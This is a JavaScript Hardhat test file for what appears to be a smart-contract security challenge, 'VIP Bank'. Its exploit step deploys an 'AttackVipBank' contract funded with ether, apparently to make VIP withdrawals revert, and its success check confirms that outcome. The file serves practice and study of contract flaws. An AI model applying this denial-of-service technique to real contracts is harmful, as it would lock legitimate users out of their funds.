const {time, loadFixture,} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");

describe("VIP Bank", function () {

  let deployer, vipUser, attacker;
  
  before(async function (){
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, vipUser, attacker] = await ethers.getSigners();

    const bankFactory = await ethers.getContractFactory("VIP_Bank");
    this.bank = await bankFactory.deploy();
    await this.bank.addVIP(vipUser.address);

    // VIP user able to deposit and withdraw
    await this.bank.connect(vipUser).deposit({value:100});
    await this.bank.connect(vipUser).withdraw(100);

  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */

    // Deploy attack contract
    const etherAmt = ethers.utils.parseEther('0.07');
    const AttackVipBankFactory = await ethers.getContractFactory("AttackVipBank");
    AttackVipBank = await AttackVipBankFactory.deploy(this.bank.address, {value:etherAmt});

  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // VIP user able to depoit , but unable to withdraw
    await this.bank.connect(vipUser).deposit({value:100})
    expect(await this.bank.connect(vipUser).withdraw(100)).revertedWith("Cannot withdraw more than 0.5 ETH per transaction");        
  });

});
